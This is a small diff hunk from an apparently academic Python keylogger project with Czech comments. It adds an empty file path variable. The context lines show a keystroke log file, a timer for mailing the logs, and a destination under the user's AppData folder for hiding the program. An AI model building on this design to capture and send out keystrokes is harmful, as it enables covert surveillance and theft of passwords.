@@ -12,6 +12,7 @@ from threading import Timer     #pro dalsi vlakno pro casovac pro odesilani mail
 
 log_file = "klog.txt"    #nazev souboru pro ukladani klaves    
 #file_path = "D:\\Škola\\UNOB\\7. semestr\\Vývoj a správa IS\\Python\\ProjektKeylogger\\"  #cesta k souboru pro ukladani klaves
+file_path=""
 
 username = getuser()    #ziskani uzivatelskeho jmena prihlaseneho uzivatele
 destination_path = f"C:\\Users\\{username}\\AppData\\"  #cesta do slozky pro ulozeni odchytavace
